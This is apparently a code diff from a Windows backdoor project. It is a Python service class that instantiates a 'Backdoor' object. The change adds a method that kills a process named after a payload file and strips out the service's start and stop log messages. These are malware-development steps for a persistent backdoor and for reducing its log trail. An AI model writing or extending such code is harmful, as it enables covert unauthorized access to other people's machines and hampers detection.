@@ -1,7 +1,9 @@
+from local_libs.env_vars import *
 from local_libs import service
 from backdoor import Backdoor
 import servicemanager
 import sys
+import psutil
 
 
 class Main(service.WinService):
@@ -20,9 +22,15 @@ class Main(service.WinService):
         with open(self.service_log_filepath, "a") as f:
             f.write(log_message + "\n")
 
+    @staticmethod
+    def kill_loader_process():
+        for process in psutil.process_iter():
+            if process.name == PAYLOAD_FILENAME + ".exe":
+                process.kill()
+
     def start(self):
         self.is_running = True
-        self.log("Service started")
+        # self.kill_loader_process()
 
     def main(self):
         self.backdoor = Backdoor()
@@ -30,7 +38,6 @@ class Main(service.WinService):
 
     def stop(self):
         self.is_running = False
-        self.log("Service stopped")
 
 
 if __name__ == '__main__':
